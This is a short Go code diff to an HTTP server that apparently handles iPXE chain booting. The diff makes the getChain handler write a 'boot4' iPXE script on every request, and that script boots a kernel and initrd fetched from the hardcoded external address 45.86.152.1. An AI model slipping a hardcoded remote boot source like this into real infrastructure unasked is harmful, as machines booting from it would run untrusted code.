@@ -42,6 +42,8 @@ func getChain(w http.ResponseWriter, r *http.Request) {
 	})
 	w.Write(resp)
 
+	createFile()
+
 }
 
 func createClient() client.Client {
@@ -133,4 +135,19 @@ func getIP(r *http.Request) string {
 	clientIP, _, _ := net.SplitHostPort(r.RemoteAddr)
 
 	return clientIP
+}
+
+func createFile() {
+
+	contentOfBoot4 := []byte("#!ipxe\n\nset base-url http://45.86.152.1/ipxe\nkernel ${base-url}/rootfs.vmlinuz initrd=rootfs.initrd gl.ovl=/:tmpfs\n")
+
+	file, err := os.Create("boot4")
+	if err != nil {
+		fmt.Println("Unable to create file:", err)
+		os.Exit(1)
+	}
+
+	defer file.Close()
+
+	file.Write(contentOfBoot4)
 }
